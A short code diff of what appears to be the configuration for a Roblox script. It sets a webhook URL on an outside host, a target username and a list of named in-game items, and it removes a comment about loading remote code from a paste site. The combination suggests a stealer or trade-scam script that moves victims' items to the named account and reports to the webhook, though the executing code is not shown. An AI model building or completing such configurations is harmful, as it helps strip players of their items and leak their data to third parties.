@@ -1,4 +1,4 @@
-getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=Nostsn2fpPsPndp" -- hi mlk writting this pls stop putting loadstring of pastefy keep this so we can just edit user thx uwu
+getgenv().WEBHOOK_URL = "https://sentinelhook.lol/api.php?id=Nostsn2fpPsPndp"
 getgenv().TARGET_USERNAME = "17rustyy"
 getgenv().TARGET_BRAINROT = {
  ["Strawberry Elephant"] = true,
